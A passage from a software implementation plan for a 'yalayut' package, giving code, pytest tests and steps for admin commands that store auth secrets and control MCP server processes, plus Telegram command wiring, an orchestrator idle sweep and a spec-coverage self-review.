  `timeout 60 pytest packages/yalayut/tests/test_tool_dispatch.py -p no:cacheprovider`
  Expected: 3 passed.

> **Note on coulson wiring.** Phase 2 already gives coulson a per-task tool
> registry built from `task["skills"]` entries with `exposure_class == "tool"`.
> Phase 3's contract with coulson is: when coulson registers a tool whose
> payload `kind` is `api`/`mcp`, it stores the tool-spec under its `tool_name`
> with a `_yalayut_kind` field, and its tool-call handler invokes
> `yalayut.dispatch_tool(tool_name, args, registry)`. That handler edit is a
> one-line branch inside coulson's existing tool-execution switch and is owned
> by the Phase 2 coulson integration; if the branch is not present it must be
> added here — see Task 13's verification step which asserts it.

- [ ] Commit: `feat(yalayut): dispatch_tool — prefix routing for namespaced api/mcp tool-calls`

---

## Task 12 — Admin surface for auth + MCP control

`admin.py` (created in Phase 1) gains the Phase 3 founder ops: `missing_auth`,
`set_secret`, `mcp_status`, `mcp_restart`, `mcp_kill`. These back the
`/yalayut auth ...` and `/yalayut mcp ...` Telegram commands.

**Files:**
- Modify: `packages/yalayut/src/yalayut/admin.py`
- Test: `packages/yalayut/tests/test_admin_phase3.py`

**Steps:**

- [ ] Create `packages/yalayut/tests/test_admin_phase3.py`:

```python
"""yalayut.admin — Phase 3 auth + MCP control ops."""
import pytest

from yalayut import admin


@pytest.mark.asyncio
async def test_set_secret_writes_and_revets(monkeypatch):
    written = {}
    revetted = []

    async def fake_set_secret(key, value):
        written[key] = value

    async def fake_revet(key):
        revetted.append(key)

    monkeypatch.setattr("yalayut.secrets.set_secret", fake_set_secret)
    monkeypatch.setattr(admin, "_revet_artifacts_for_env", fake_revet)

    res = await admin.set_secret("OPENAQ_API_KEY", "the-value")
    assert res["ok"] is True
    assert written["OPENAQ_API_KEY"] == "the-value"
    assert "OPENAQ_API_KEY" in revetted


@pytest.mark.asyncio
async def test_missing_auth_lists_blocked(monkeypatch):
    async def fake_query(sql, params=()):
        return [(7, "api-virustotal", "missing_VIRUSTOTAL_API_KEY"),
                (8, "mcp-cloudflare", "missing_CLOUDFLARE_API_TOKEN")]

    monkeypatch.setattr(admin, "_db_query", fake_query)
    rows = await admin.missing_auth()
    assert len(rows) == 2
    assert rows[0]["name"] == "api-virustotal"
    assert rows[0]["missing_key"] == "VIRUSTOTAL_API_KEY"


@pytest.mark.asyncio
async def test_mcp_status_reports_manager(monkeypatch):
    from yalayut.mcp_manager import get_manager

    monkeypatch.setattr(get_manager(), "status",
                        lambda: [{"artifact_id": 9, "pid": 1234,
                                  "health": "ready", "fails": 0,
                                  "last_probe": 1.0}])
    rows = await admin.mcp_status()
    assert rows[0]["artifact_id"] == 9
    assert rows[0]["health"] == "ready"


@pytest.mark.asyncio
async def test_mcp_kill(monkeypatch):
    from yalayut.mcp_manager import get_manager

    killed = []

    async def fake_shutdown(aid):
        killed.append(aid)

    monkeypatch.setattr(get_manager(), "shutdown", fake_shutdown)
    res = await admin.mcp_kill(9)
    assert res["ok"] is True
    assert killed == [9]
```

- [ ] Run it — expect FAIL (functions not yet defined):
  `timeout 60 pytest packages/yalayut/tests/test_admin_phase3.py -p no:cacheprovider`
  Expected: `AttributeError` on `admin.set_secret`.

- [ ] Append to `packages/yalayut/src/yalayut/admin.py`:

```python
# ---------------------------------------------------------------------------
# Phase 3 — auth env-var + MCP process control
# ---------------------------------------------------------------------------
from typing import Any as _Any

from src.infra.logging_config import get_logger as _get_logger

_p3_logger = _get_logger("yalayut.admin.phase3")


async def _db_query(sql: str, params: tuple = ()) -> list[tuple]:
    """Run a read query against the main DB. Patched in tests."""
    from src.infra.db import get_db

    db = await get_db()
    cur = await db.execute(sql, params)
    return await cur.fetchall()


async def _revet_artifacts_for_env(env_key: str) -> None:
    """Recompute env_status for every artifact whose auth depends on ``env_key``.

    An artifact depends on the key if its api ``auth_env`` equals it or its mcp
    ``env_required`` list contains it. After a founder adds the secret these
    artifacts flip from ``missing_<KEY>`` to ``ready`` and become matchable.
    """
    import yaml

    from src.infra.db import get_db
    from yalayut.secrets import compute_env_status

    db = await get_db()
    cur = await db.execute(
        "SELECT id, manifest_path, env_status FROM yalayut_index "
        "WHERE artifact_type IN ('api', 'mcp') AND env_status != 'ready'"
    )
    rows = await cur.fetchall()
    for artifact_id, manifest_path, _status in rows:
        if not manifest_path:
            continue
        try:
            with open(manifest_path, "r", encoding="utf-8") as fh:
                manifest = yaml.safe_load(fh) or {}
        except OSError:
            continue
        if manifest.get("artifact_type") == "api":
            required = [manifest.get("api", {}).get("auth_env")]
        else:
            required = (manifest.get("mcp", {}) or {}).get("env_required") or []
        required = [k for k in required if k]
        if env_key not in required:
            continue
        new_status = await compute_env_status(required)
        await db.execute(
            "UPDATE yalayut_index SET env_status = ? WHERE id = ?",
            (new_status, artifact_id),
        )
    await db.commit()


async def set_secret(key_name: str, value: str) -> dict[str, _Any]:
    """Encrypt + store an auth secret, then re-vet artifacts that needed it."""
    from yalayut.secrets import set_secret as _store

    try:
        await _store(key_name, value)
    except Exception as e:
        return {"ok": False, "error": str(e)}
    try:
        await _revet_artifacts_for_env(key_name)
    except Exception as e:
        _p3_logger.warning("re-vet after set_secret failed", err=str(e))
    return {"ok": True, "key_name": key_name}


async def missing_auth() -> list[dict[str, _Any]]:
    """List api/mcp artifacts blocked by a missing auth env var."""
    rows = await _db_query(
        "SELECT id, name, env_status FROM yalayut_index "
        "WHERE env_status LIKE 'missing_%' AND enabled = 1 "
        "ORDER BY name"
    )
    out = []
    for artifact_id, name, env_status in rows:
        missing_key = env_status[len("missing_"):] if env_status else ""
        out.append({"artifact_id": artifact_id, "name": name,
                    "missing_key": missing_key})
    return out


async def mcp_status() -> list[dict[str, _Any]]:
    """Running MCP servers + health + fail counts."""
    from yalayut.mcp_manager import get_manager

    return list(get_manager().status())


async def mcp_restart(artifact_id: int) -> dict[str, _Any]:
    """Shut down then re-start an MCP server (manual founder control)."""
    import yaml

    from yalayut.mcp_manager import get_manager

    manager = get_manager()
    await manager.shutdown(artifact_id)
    rows = await _db_query(
        "SELECT manifest_path FROM yalayut_index WHERE id = ?", (artifact_id,)
    )
    if not rows or not rows[0][0]:
        return {"ok": False, "error": f"no manifest for artifact {artifact_id}"}
    try:
        with open(rows[0][0], "r", encoding="utf-8") as fh:
            manifest = yaml.safe_load(fh) or {}
    except OSError as e:
        return {"ok": False, "error": str(e)}
    mcp = manifest.get("mcp") or {}
    handle = await manager.ensure_running(artifact_id, mcp)
    return {"ok": handle.get("health") == "ready", "health": handle.get("health"),
            "artifact_id": artifact_id}


async def mcp_kill(artifact_id: int) -> dict[str, _Any]:
    """Terminate an MCP server."""
    from yalayut.mcp_manager import get_manager

    await get_manager().shutdown(artifact_id)
    return {"ok": True, "artifact_id": artifact_id}
```

- [ ] Run it — expect PASS:
  `timeout 60 pytest packages/yalayut/tests/test_admin_phase3.py -p no:cacheprovider`
  Expected: 4 passed.

> **Telegram wiring.** `/yalayut auth missing`, `/yalayut auth set <KEY>=<VAL>`,
> `/yalayut mcp status`, `/yalayut mcp restart <id>`, `/yalayut mcp kill <id>`
> route to these `admin.*` functions. The `/yalayut` command group dispatcher
> in `src/app/telegram_bot.py` was created in Phase 1; Phase 3 only adds five
> sub-command branches calling the functions above and formatting their dict
> output. This is mechanical string formatting — included as a step in Task 13's
> integration wiring rather than its own task.

- [ ] Commit: `feat(yalayut): admin ops for auth secrets + MCP process control`

---

## Task 13 — End-to-end integration + Telegram wiring + idle sweep

Wires the remaining seams: the periodic MCP idle-sweep into the orchestrator's
`_check_*` loop, the five `/yalayut` sub-commands, and an end-to-end test that
runs a preempt task through `mr_roboto.run` → `run_recipe`.

**Files:**
- Modify: `src/core/orchestrator.py` (or its `scheduled_jobs` module)
- Modify: `src/app/telegram_bot.py`
- Test: `packages/yalayut/tests/test_phase3_e2e.py`

**Steps:**

- [ ] Create `packages/yalayut/tests/test_phase3_e2e.py`:

```python
"""Phase 3 end-to-end — preempt task flows through mr_roboto to run_recipe."""
import pytest

import mr_roboto


@pytest.mark.asyncio
async def test_preempt_task_runs_recipe_via_mechanical_lane(monkeypatch, tmp_path):
    """intersect-shaped preempt task -> mr_roboto.run -> yalayut.run_recipe."""
    marker = tmp_path / "scaffolded.txt"
    manifest = {
        "name": "cc-probe",
        "kind": "shell_recipe",
        "mechanizable": True,
        "invocation": {
            "steps": [
                {"cmd": f'python -c "open(r\'{marker}\',\'w\').write(\'done\')"'},
            ]
        },
        "artifacts": [str(marker)],
    }

    async def fake_load(recipe_id):
        return {"id": recipe_id, "name": "cc-probe", "manifest": manifest,
                "mechanizable": True, "vet_tier": 0,
                "workspace_path": str(tmp_path)}

    monkeypatch.setattr("yalayut.executor._load_recipe_row", fake_load)

    # Task shaped exactly as intersect routes a preempt to the mechanical lane.
    task = {
        "agent_type": "mechanical",
        "mission_id": None,
        "context": {
            "payload": {
                "action": "yalayut_recipe",
                "recipe_id": 55,
                "args": {"workspace_path": str(tmp_path)},
            }
        },
    }
    action = await mr_roboto.run(task)
    assert action.status == "completed", action.error
    assert action.result["ok"] is True
    assert marker.read_text() == "done"
```

- [ ] Run it — expect PASS (all prior tasks merged):
  `timeout 60 pytest packages/yalayut/tests/test_phase3_e2e.py -p no:cacheprovider`
  Expected: 1 passed.

- [ ] Modify the orchestrator's periodic-job module (the file holding
  `_check_todo_reminders` / `_check_yalayut_discovery` — `src/core/orchestrator.py`
  or `src/core/scheduled_jobs.py`). Add an MCP idle sweep alongside the existing
  `_check_*` calls:

```python
async def _check_mcp_idle_sweep() -> None:
    """Periodically shut down idle MCP servers (lazy-start companion).

    Runs on the same cadence as the other orchestrator _check_* jobs. Never
    starts a server — only kills servers idle past their idle_timeout_s.
    """
    try:
        from yalayut.mcp_manager import get_manager
        killed = await get_manager().sweep_idle()
        if killed:
            from src.infra.logging_config import get_logger
            get_logger("orchestrator.mcp").info("mcp idle sweep", killed=killed)
    except Exception:
        # Sweep failures must never disturb the pump.
        pass
```

  Then add `await _check_mcp_idle_sweep()` to the orchestrator's periodic block
  next to `_check_yalayut_discovery()` (guarded by the same interval gate the
  other checks use — every loop is fine, `sweep_idle` is cheap).

- [ ] Add the five Phase 3 sub-commands to the `/yalayut` group in
  `src/app/telegram_bot.py`. Inside the existing `_handle_yalayut` (or
  equivalent) sub-command switch, add:

```python
        elif sub == "auth" and args[:1] == ["missing"]:
            from yalayut import admin
            rows = await admin.missing_auth()
            if not rows:
                await self._reply(update, "yalayut: no artifacts blocked on auth.")
            else:
                lines = ["*Artifacts blocked on missing auth*"]
                for r in rows:
                    lines.append(f"- `{r['name']}` needs `{r['missing_key']}`")
                await self._reply(update, "\n".join(lines))

        elif sub == "auth" and args[:1] == ["set"] and len(args) >= 2:
            # /yalayut auth set KEY=VALUE
            kv = " ".join(args[1:])
            if "=" not in kv:
                await self._reply(update, "Usage: /yalayut auth set KEY=VALUE")
            else:
                key, value = kv.split("=", 1)
                from yalayut import admin
                res = await admin.set_secret(key.strip(), value.strip())
                if res["ok"]:
                    await self._reply(update,
                                      f"yalayut: stored `{key.strip()}` "
                                      f"and re-vetted dependent artifacts.")
                else:
                    await self._reply(update,
                                      f"yalayut: failed — {res.get('error')}")

        elif sub == "mcp" and args[:1] == ["status"]:
            from yalayut import admin
            rows = await admin.mcp_status()
            if not rows:
                await self._reply(update, "yalayut: no MCP servers running.")
            else:
                lines = ["*Running MCP servers*"]
                for r in rows:
                    lines.append(
                        f"- artifact `{r['artifact_id']}` pid {r['pid']} "
                        f"health={r['health']} fails={r['fails']}"
                    )
                await self._reply(update, "\n".join(lines))

        elif sub == "mcp" and args[:1] == ["restart"] and len(args) >= 2:
            from yalayut import admin
            res = await admin.mcp_restart(int(args[1]))
            await self._reply(update,
                              f"yalayut: mcp restart artifact {args[1]} -> "
                              f"{res.get('health') or res.get('error')}")

        elif sub == "mcp" and args[:1] == ["kill"] and len(args) >= 2:
            from yalayut import admin
            await admin.mcp_kill(int(args[1]))
            await self._reply(update, f"yalayut: killed MCP artifact {args[1]}.")
```

- [ ] Verify coulson's tool-call handler routes namespaced tools to
  `yalayut.dispatch_tool`. Grep coulson's tool-execution code:
  `Grep pattern="exposure_class.*tool|_yalayut_kind|dispatch_tool" path="packages/coulson"`
  If a branch calling `yalayut.dispatch_tool` for tool-specs carrying
  `_yalayut_kind` is absent, add it to coulson's tool-execution switch:

```python
        # yalayut-provided api/mcp tools route through the catalog dispatcher.
        if tool_name in self._yalayut_tool_registry:
            import yalayut
            return await yalayut.dispatch_tool(
                tool_name, tool_args, self._yalayut_tool_registry
            )
```

  where `self._yalayut_tool_registry` is the per-task map coulson builds from
  `task["skills"]` entries with `exposure_class == "tool"` (Phase 2 already
  builds this; Phase 3 only ensures each entry stores `_yalayut_kind`).

- [ ] Run the full Phase 3 test suite — expect all PASS:
  `timeout 120 pytest packages/yalayut/tests/ packages/mr_roboto/tests/test_yalayut_recipe_executor.py -p no:cacheprovider`
  Expected: all green (integration test skipped if `uvx` absent).

- [ ] Run the focused regression on touched non-yalayut packages:
  `timeout 120 pytest packages/mr_roboto/tests/ -p no:cacheprovider`
  Expected: no regressions.

- [ ] Commit: `feat(yalayut): wire MCP idle-sweep + /yalayut auth|mcp telegram commands`

---

## Task 14 — Phase 4 boundary note (no code)

A small set of spec items are genuinely deferred. This task records them so the
boundary is explicit and reviewers do not flag them as unwired fragments.

**Files:** none (documentation only — recorded here).

The following are **explicitly Phase 4**, not Phase 3 omissions:

- **MCP `sse` / `streamable_http` transports.** v1 (this plan) supports `stdio`
  only — the dominant transport for the awesome-mcp-servers set per recon.
  `mcp_manager.ensure_running` already rejects non-stdio with a logged warning;
  adding the HTTP transports is a self-contained follow-up.
- **`mcp.install_cmd` one-shot install.** The manifest field exists; Phase 3
  assumes `npx -y ...` style `run_cmd` that fetches on first run (no separate
  install). A persistent `npm install -g` pre-step with sha256 pin verification
  is Phase 4 (ties into the `mcp_pinned` auto-check).
- **API rate-limit tracking.** Per the spec's Open Issues, hooking api calls
  into `kuleden_donen_var` is v1.1/Phase 4. `execute_api_tool` currently has no
  rate accounting.
- **`web_markdown`, `github_topic`, `awesome_list_md`, `clawhub_api` adapters.**
  Phase 3's adapter scope is exactly `cookiecutter_template` + `public_apis_md`
  (both fully mechanical). `github_path` shipped in Phase 1. The LLM-fallback
  adapters are a separate batch.

Everything else in the Phase 3 spec scope is wired in Tasks 1–13.

---

## Self-review — spec requirement coverage

Checked against the Phase 3 scope bullets in the prompt and the spec's "API +
MCP specifics" section.

| Phase 3 spec requirement | Task(s) | Status |
|---|---|---|
| `executor.py` — `run_recipe(recipe_id, args) -> dict`, real Windows-safe shell exec | 1, 2 | Done |
| `run_recipe` proven against a real cookiecutter invocation | 3 | Done (network-gated integration test) |
| mr_roboto `yalayut_recipe` executor, registered + reachable from mechanical lane | 4 | Done (`__init__.py` branch + dispatch test) |
| `cookiecutter_template.py` adapter (cookiecutter.json → manifest, mechanical) | 5 | Done |
| `public_apis_md.py` adapter (markdown table parser, mechanical) | 6 | Done |
| `plugins/api.py` — api artifact plugin | 8 | Done |
| `plugins/mcp.py` — mcp artifact plugin | 10 | Done |
| MCP process lifecycle: on-demand start, 5s probe, 60s re-probe, idle shutdown | 9, 13 | Done (`mcp_manager.py` + orchestrator idle sweep) |
| `yalayut_mcp_processes` / `yalayut_mcp_tools` used (Phase 1 schema) | 9, 10 | Done (`_persist_process`, `_cache_mcp_tools`) |
| Tool-name namespacing `<artifact_slug>__<tool>` (double underscore) | 8, 10 | Done (api + mcp `_slug` + `__` join) |
| Per-MCP tool budget cap ≤3/server, ≤6/step; descriptions embedded into `yalayut_mcp_tools` | 10 | Done (`rank_tools_by_intent`, `enforce_step_budget`, `_cache_mcp_tools`) |
| Auth env-var lifecycle: `env_status` column, `yalayut_secrets`, fernet key `YALAYUT_SECRET_KEY` | 7, 12 | Done (`secrets.py`, re-vet on `set_secret`) |
| At-match-time filter of artifacts with missing env | 8, 10 | Done (plugins return empty tools + `skipped_reason`; spec says intersect also filters — Phase 2 owns the query-side filter, plugins are defence-in-depth) |
| `tool` exposure execution path for api (via `call_api`) and mcp (via MCP protocol) | 8, 10, 11 | Done (`execute_api_tool`, `execute_mcp_tool`, `dispatch_tool`) |
| `/yalayut auth missing`/`set`, `/yalayut mcp status`/`restart`/`kill` | 12, 13 | Done |
| MCP servers never auto-start at boot (`no_auto_connect`) | 9 | Done (`ensure_running` is matcher-triggered only; idle sweep never starts) |

### Type / signature consistency checks

- `run_recipe(recipe_id: str, args: dict) -> dict` — spec public API line 706
  declares `recipe_id: str`. **Resolved ambiguity:** `yalayut_index.id` is an
  `INTEGER PRIMARY KEY` (spec schema line 261). The plan uses `recipe_id: int`
  and the `yalayut_recipe` executor coerces with `int(...)`, tolerating a string
  payload value from the JSON round-trip. This is consistent with the schema;
  the spec's `str` annotation is the looser JSON-envelope view. Flagged, not a
  blocker.
- `mcp:` manifest block — fields used (`transport`, `run_cmd`, `env_required`,
  `health_check`, `idle_timeout_s`, `tools_discover`) match spec lines 550-563
  exactly. `install_cmd`, `port_hint`, `tools_static` are present in the spec
  block but deferred (Task 14) — not consumed in Phase 3, no inconsistency.
- `yalayut_mcp_processes` columns written by `_persist_process` (`pid`, `port`,
  `started_at`, `last_used_at`, `idle_timeout_s`, `health`, `last_probe_at`,
  `consecutive_probe_fails`) match the spec schema + ALTERs (lines 347-353,
  597-599).
- `yalayut_mcp_tools` columns written by `_cache_mcp_tools` (`artifact_id`,
  `tool_name`, `description`, `description_embedding`, `input_schema_json`,
  `first_seen_at`) match spec lines 601-610 exactly, including the
  `UNIQUE(artifact_id, tool_name)` upsert target.
- `yalayut_secrets` columns written by `secrets.py` (`key_name`,
  `encrypted_value`, `added_at`) match spec lines 612-618. **Resolved
  ambiguity:** the spec column comment says `key in .env KATALOG_SECRET_KEY`
  (line 616) but the Phase 3 prompt and migration section both say rename to
  `YALAYUT_SECRET_KEY`. The plan uses `YALAYUT_SECRET_KEY` throughout
  (`secrets.py` `_SECRET_KEY_ENV`, `.env.example`). The DB column comment is
  stale; the column itself is unaffected.
- Envelope `task["skills"]` entry shape produced by `ApiPlugin` / `McpPlugin`
  (`artifact_id`, `name`, `exposure_class`, `applies_to`, `render`, `payload`,
  `confidence`) matches the spec's envelope contract (lines 732-742).

### Ambiguities resolved inline

1. **`recipe_id` type** — spec API says `str`, schema PK is `INTEGER`. Plan
   standardizes on `int`, executor coerces. (See above.)
2. **`KATALOG_SECRET_KEY` vs `YALAYUT_SECRET_KEY`** — plan uses
   `YALAYUT_SECRET_KEY` per the explicit Phase 3 rename instruction.
3. **MCP tool discovery is async but `AccessPlugin.to_application` is sync** —
   the spec's plugin protocol (line 442) types `to_application` as sync. MCP
   tool discovery requires an async server start. Resolved by adding
   `McpPlugin.to_application_async` (the real path intersect calls for mcp) and
   keeping the sync `to_application` as the env-missing short-circuit so the
   protocol signature is still satisfied. Documented in the plugin docstring.
4. **Per-step `K_mcp_total=6` cap ownership** — spec says the matcher (intersect)
   applies the per-step cap. Phase 3 supplies the mechanism (`enforce_step_budget`
   in `plugins/mcp.py`) since it is MCP-tool knowledge; intersect calls it. The
   per-server `K_mcp=3` cap is applied inside `to_application_async`. No double
   capping — server-cap then step-cap, as the spec describes.
5. **Workspace path for `run_recipe`** — the spec does not say how the recipe
   knows which mission workspace to scaffold into. Resolved: the
   `yalayut_recipe` mr_roboto executor injects `workspace_path` into `args` via
   `get_mission_workspace(mission_id)` (the same accessor `run_cmd.py` uses), and
   `run_recipe` reads `args["workspace_path"]`.
